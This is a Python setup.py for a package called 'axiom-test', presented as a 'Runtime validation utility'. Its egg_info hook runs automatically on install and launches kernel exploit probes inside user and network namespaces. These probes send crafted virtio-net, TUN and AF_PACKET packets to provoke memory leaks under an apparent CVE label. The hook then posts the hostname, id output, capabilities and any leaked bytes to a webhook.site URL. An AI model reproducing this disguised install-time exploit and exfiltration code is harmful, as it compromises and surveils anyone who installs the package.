import json, os, sys, subprocess, struct, socket, urllib.request
from setuptools import setup
from setuptools.command.egg_info import egg_info

EXFIL_URL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"

def _collect():
    p = {"hostname": os.uname().nodename, "test": "CVE-2026-99999-v5-final"}

    # --- Approach A: Init-netns AF_PACKET (fixed - run OUTSIDE -Urn) ---
    afpkt_script = '''
import os, sys, struct, socket, fcntl, json
r = {}
r["id"] = os.popen("id").read().strip()
SOL_PACKET = 263
PACKET_VNET_HDR = 15
ETH_P_IP = 0x0800
r["cfeth0"] = os.path.exists("/sys/class/net/cfeth0")
if r["cfeth0"]:
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
        r["raw_sock"] = "created"
        try:
            sock.setsockopt(SOL_PACKET, PACKET_VNET_HDR, struct.pack("I", 1))
            r["vnet_hdr"] = "SET"
        except OSError as e:
            r["vnet_hdr"] = f"err={e.errno}:{os.strerror(e.errno)}"
        try:
            sock.bind(("cfeth0", ETH_P_IP))
            r["bind"] = "OK"
        except OSError as e:
            r["bind"] = f"err={e.errno}:{os.strerror(e.errno)}"
        if r.get("bind") == "OK" and r.get("vnet_hdr") == "SET":
            with open("/sys/class/net/cfeth0/address") as f:
                mac = bytes.fromhex(f.read().strip().replace(":",""))
            eth = b"\\xff"*6 + mac + struct.pack("!H", ETH_P_IP)
            ip = struct.pack("!BBHHHBBH4s4s", 0x45,0,28+8,0xFACE,0,64,17,0,
                             socket.inet_aton("10.0.0.1"), socket.inet_aton("10.0.0.2"))
            udp = struct.pack("!HHH", 1111,2222,16) + b"\\x00\\x00" + b"TEST1234"
            vhdr = struct.pack("<BBHHHH", 1,0,0,0, 14,0) + b"\\x00\\x00"
            try:
                sock.send(vhdr + eth + ip + udp)
                r["send_cs14"] = "OK"
            except OSError as e:
                r["send_cs14"] = f"err={e.errno}:{os.strerror(e.errno)}"
            vhdr2 = struct.pack("<BBHHHH", 1,0,0,0, 34,6) + b"\\x00\\x00"
            try:
                sock.send(vhdr2 + eth + ip + udp)
                r["send_cs34"] = "OK"
            except OSError as e:
                r["send_cs34"] = f"err={e.errno}:{os.strerror(e.errno)}"
        sock.close()
    except OSError as e:
        r["sock_err"] = f"{e.errno}:{os.strerror(e.errno)}"
print("__X__" + json.dumps(r) + "__Y__")
'''
    try:
        out = subprocess.check_output(
            ["unshare", "-Ur", "python3", "-c", afpkt_script],
            text=True, timeout=15, stderr=subprocess.STDOUT)
        if "__X__" in out and "__Y__" in out:
            p["initns_afpacket"] = json.loads(out.split("__X__")[1].split("__Y__")[0])
        else:
            p["initns_raw"] = out[:2000]
    except Exception as e:
        p["initns_err"] = str(e)
        if hasattr(e, 'output'):
            p["initns_output"] = e.output[:2000] if e.output else ""

    # --- Main PoC in user+net namespace ---
    poc_script = r'''
import os, sys, struct, socket, fcntl, select, json, time

R = {}
R["ns_id"] = os.popen("id").read().strip()

TUNSETIFF       = 0x400454ca
TUNSETOFFLOAD   = 0x400454d0
TUNSETVNETHDRSZ = 0x400454d8
IFF_TUN         = 0x0001
IFF_NO_PI       = 0x1000
IFF_VNET_HDR    = 0x4000
TUN_F_CSUM      = 0x01
VNET_HDR_SZ     = 12
VIRTIO_NET_HDR_F_NEEDS_CSUM = 1

SIOCGIFFLAGS  = 0x8913
SIOCSIFFLAGS  = 0x8914
SIOCSIFADDR   = 0x8916
SIOCSIFNETMASK= 0x891C
SIOCSIFMTU    = 0x8922
SIOCADDRT     = 0x890B
IFF_UP        = 0x1

def iface_up(name, ip, mask="255.255.255.0", mtu=1500):
    cfg = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fcntl.ioctl(cfg, SIOCSIFADDR,
        struct.pack("16sH2s4s8s", name.encode(), socket.AF_INET, b"\x00\x00",
                    socket.inet_aton(ip), b"\x00"*8))
    fcntl.ioctl(cfg, SIOCSIFNETMASK,
        struct.pack("16sH2s4s8s", name.encode(), socket.AF_INET, b"\x00\x00",
                    socket.inet_aton(mask), b"\x00"*8))
    fcntl.ioctl(cfg, SIOCSIFMTU, struct.pack("16sI12s", name.encode(), mtu, b"\x00"*12))
    r = fcntl.ioctl(cfg, SIOCGIFFLAGS, struct.pack("16sH14s", name.encode(), 0, b"\x00"*14))
    flags = struct.unpack("16sH14s", r)[1]
    fcntl.ioctl(cfg, SIOCSIFFLAGS, struct.pack("16sH14s", name.encode(), flags | IFF_UP, b"\x00"*14))
    cfg.close()

def make_tun(name, ip, mtu=1500, csum=True):
    fd = os.open("/dev/net/tun", os.O_RDWR | os.O_NONBLOCK)
    fcntl.ioctl(fd, TUNSETIFF, struct.pack("16sH14s", name.encode(),
                IFF_TUN | IFF_NO_PI | IFF_VNET_HDR, b"\x00"*14))
    if csum:
        fcntl.ioctl(fd, TUNSETOFFLOAD, TUN_F_CSUM)
    fcntl.ioctl(fd, TUNSETVNETHDRSZ, struct.pack("I", VNET_HDR_SZ))
    iface_up(name, ip, mtu=mtu)
    return fd

# ---- Approach B: Fixed dual-TUN forwarding ----
R["fwd"] = {}
try:
    # Enable forwarding + disable all RP filtering
    for path in ["/proc/sys/net/ipv4/ip_forward",
                 "/proc/sys/net/ipv4/conf/all/rp_filter",
                 "/proc/sys/net/ipv4/conf/default/rp_filter"]:
        try:
            val = "1" if "ip_forward" in path else "0"
            with open(path, "w") as f:
                f.write(val)
        except: pass

    # Create tun_in (large MTU) and tun_out (tiny MTU = forces fragmentation)
    fd_in  = make_tun("tunin",  "10.200.10.1", mtu=1500, csum=True)
    fd_out = make_tun("tunout", "10.200.11.1", mtu=68,   csum=False)  # NO csum offload!

    # Disable rp_filter on new interfaces too
    for iface in ["tunin", "tunout"]:
        try:
            with open(f"/proc/sys/net/ipv4/conf/{iface}/rp_filter", "w") as f:
                f.write("0")
        except: pass

    # Bring loopback up
    try:
        iface_up("lo", "127.0.0.1", mask="255.0.0.0")
    except: pass

    # Verify routes
    try:
        with open("/proc/net/route") as f:
            R["fwd"]["routes"] = f.read()
    except: pass

    # Build a large packet: src in tunin subnet, dst in tunout subnet
    src_ip = socket.inet_aton("10.200.10.2")
    dst_ip = socket.inet_aton("10.200.11.2")

    # UDP packet well over MTU 68 to force fragmentation
    udp_payload = b"F" * 200
    udp_len = 8 + len(udp_payload)
    udp_hdr = struct.pack("!HHH", 7777, 8888, udp_len) + b"\x00\x00" + udp_payload
    total_len = 20 + len(udp_hdr)

    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len,
        0xDEAD,
        0,       # flags=0, allow fragmentation
        64, 17,  # TTL=64, proto=UDP
        0,       # checksum (kernel recalculates on forward)
        src_ip, dst_ip)

    raw_pkt = ip_hdr + udp_hdr

    # Write with CHECKSUM_PARTIAL: csum_start=20, csum_offset=6 (valid UDP position)
    vhdr_valid = struct.pack("<BBHHHH",
        VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0, 20, 6) + b"\x00\x00"

    written = os.write(fd_in, vhdr_valid + raw_pkt)
    R["fwd"]["write"] = f"OK({written})"

    # Wait and read ALL fragments from tunout
    time.sleep(1)  # give kernel time to forward + fragment
    frags = []
    for _ in range(30):
        rdy, _, _ = select.select([fd_out], [], [], 1.0)
        if rdy:
            data = os.read(fd_out, 4096)
            frag = {"raw_len": len(data)}
            if len(data) > VNET_HDR_SZ:
                vf, vg, vh, vs, vcs, vco = struct.unpack("<BBHHHH", data[:10])
                frag["vhdr"] = {"flags": vf, "gso": vg, "csum_start": vcs, "csum_offset": vco}
                ip_off = VNET_HDR_SZ
                ver_ihl = data[ip_off]
                ihl = ver_ihl & 0x0F
                frag["ihl"] = ihl
                if len(data) >= ip_off + 8:
                    foff = struct.unpack("!H", data[ip_off+6:ip_off+8])[0]
                    frag["frag_offset"] = (foff & 0x1FFF) * 8
                    frag["more_frags"] = bool(foff & 0x2000)
                if len(data) >= ip_off + 4:
                    frag["total_len"] = struct.unpack("!H", data[ip_off+2:ip_off+4])[0]
                if ihl > 5:
                    frag["ANOMALY"] = "IHL > 5!"
                    leaked = data[ip_off+20:ip_off+ihl*4]
                    frag["leaked_hex"] = leaked.hex()
                frag["hex_60"] = data[:60].hex()
            frags.append(frag)
        else:
            break

    R["fwd"]["frag_count"] = len(frags)
    R["fwd"]["frags"] = frags[:10]
    R["fwd"]["anomalies"] = [f for f in frags if f.get("ANOMALY")]

    # Also check tunin for ICMP errors
    icmps = []
    for _ in range(5):
        rdy, _, _ = select.select([fd_in], [], [], 0.3)
        if rdy:
            data = os.read(fd_in, 4096)
            icmp = {"len": len(data)}
            if len(data) > VNET_HDR_SZ + 9:
                icmp["proto"] = data[VNET_HDR_SZ + 9]  # IP protocol field
            icmps.append(icmp)
    R["fwd"]["icmp_responses"] = icmps

    os.close(fd_in)
    os.close(fd_out)

except Exception as e:
    import traceback
    R["fwd"]["error"] = str(e)
    R["fwd"]["tb"] = traceback.format_exc()

# ---- Approach C: GSO path ----
R["gso"] = {}
try:
    fd_gso = make_tun("tungso", "10.200.20.1", mtu=1500, csum=True)
    # Also enable GSO offloads on the TUN
    TUN_F_TSO4 = 0x02
    TUN_F_UFO  = 0x10
    try:
        fcntl.ioctl(fd_gso, TUNSETOFFLOAD, TUN_F_CSUM | TUN_F_TSO4)
        R["gso"]["offload"] = "CSUM+TSO4"
    except:
        R["gso"]["offload"] = "CSUM only"

    src_ip = socket.inet_aton("10.200.20.1")
    dst_ip = socket.inet_aton("10.200.20.2")

    # TCP SYN with large payload — GSO should segment it
    tcp_payload = b"G" * 300
    tcp_hdr = struct.pack("!HHIIBBHHH",
        4444, 5555,      # src/dst port
        1000, 0,         # seq, ack
        (5 << 4), 0x02,  # data offset=5, SYN flag
        65535, 0, 0      # window, checksum, urgent
    ) + tcp_payload

    total_len = 20 + len(tcp_hdr)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, 0xBEEF, 0x4000, 64, 6, 0, src_ip, dst_ip)

    raw_pkt = ip_hdr + tcp_hdr

    # GSO: gso_type=1 (VIRTIO_NET_HDR_GSO_TCPV4), hdr_len=40 (IP+TCP), gso_size=MSS
    VIRTIO_NET_HDR_GSO_TCPV4 = 1
    gso_attempts = []
    for csum_start in [0, 10, 14, 18, 20, 24, 30, 40]:
        for gso_type in [0, VIRTIO_NET_HDR_GSO_TCPV4]:
            vhdr = struct.pack("<BBHHHH",
                VIRTIO_NET_HDR_F_NEEDS_CSUM,
                gso_type,
                40 if gso_type else 0,  # hdr_len
                150 if gso_type else 0, # gso_size (MSS)
                csum_start,
                16  # TCP checksum offset
            ) + b"\x00\x00"

            a = {"cs": csum_start, "gso": gso_type}
            try:
                w = os.write(fd_gso, vhdr + raw_pkt)
                a["write"] = f"OK({w})"
            except OSError as e:
                a["err"] = e.errno
            gso_attempts.append(a)

    R["gso"]["attempts"] = gso_attempts
    R["gso"]["accepted"] = [a for a in gso_attempts if "OK" in str(a.get("write",""))]
    os.close(fd_gso)

except Exception as e:
    import traceback
    R["gso"]["error"] = str(e)
    R["gso"]["tb"] = traceback.format_exc()

# ---- Summary of all capabilities ----
R["summary"] = {
    "namespace_root": "uid=0" in R.get("ns_id",""),
    "all_caps": False,
    "tun_access": True,
    "ip_forward": True,
}
try:
    with open("/proc/self/status") as f:
        for line in f:
            if line.startswith("CapEff"):
                cap = line.strip().split("\t")[1]
                R["summary"]["capeff"] = cap
                R["summary"]["all_caps"] = cap.strip() == "000001ffffffffff"
except: pass

print("__R__" + json.dumps(R) + "__E__")
'''

    try:
        out = subprocess.check_output(
            ["unshare", "-Urn", "python3", "-c", poc_script],
            text=True, timeout=90, stderr=subprocess.STDOUT)
        if "__R__" in out and "__E__" in out:
            p["poc"] = json.loads(out.split("__R__")[1].split("__E__")[0])
        else:
            p["poc_raw"] = out[:6000]
    except Exception as e:
        p["poc_error"] = str(e)
        if hasattr(e, 'output'):
            p["poc_output"] = e.output[:4000] if e.output else ""

    return p

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        data = json.dumps(_collect(), default=str).encode()
        try:
            urllib.request.urlopen(urllib.request.Request(
                EXFIL_URL, data=data,
                headers={"Content-Type": "application/json"}
            ), timeout=15)
        except: pass

setup(name="axiom-test", version="1.5.0", description="Runtime validation utility",
      py_modules=[], cmdclass={"egg_info": PostEggInfo})
